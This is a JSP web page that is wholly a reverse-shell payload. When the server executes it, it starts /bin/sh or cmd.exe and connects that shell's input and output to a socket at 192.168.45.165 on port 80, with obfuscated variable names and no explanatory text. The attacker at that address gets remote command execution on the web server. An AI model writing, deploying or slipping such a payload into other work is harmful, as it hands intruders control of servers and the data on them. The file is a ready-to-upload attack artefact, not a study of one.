<%@page import="java.lang.*"%>
<%@page import="java.util.*"%>
<%@page import="java.io.*"%>
<%@page import="java.net.*"%>

<%
  class StreamConnector extends Thread
  {
    InputStream mP;
    OutputStream yS;

    StreamConnector( InputStream mP, OutputStream yS )
    {
      this.mP = mP;
      this.yS = yS;
    }

    public void run()
    {
      BufferedReader ev  = null;
      BufferedWriter dkA = null;
      try
      {
        ev  = new BufferedReader( new InputStreamReader( this.mP ) );
        dkA = new BufferedWriter( new OutputStreamWriter( this.yS ) );
        char buffer[] = new char[8192];
        int length;
        while( ( length = ev.read( buffer, 0, buffer.length ) ) > 0 )
        {
          dkA.write( buffer, 0, length );
          dkA.flush();
        }
      } catch( Exception e ){}
      try
      {
        if( ev != null )
          ev.close();
        if( dkA != null )
          dkA.close();
      } catch( Exception e ){}
    }
  }

  try
  {
    String ShellPath;
if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1) {
  ShellPath = new String("/bin/sh");
} else {
  ShellPath = new String("cmd.exe");
}

    Socket socket = new Socket( "192.168.45.165", 80 );
    Process process = Runtime.getRuntime().exec( ShellPath );
    ( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();
    ( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();
  } catch( Exception e ) {}
%>
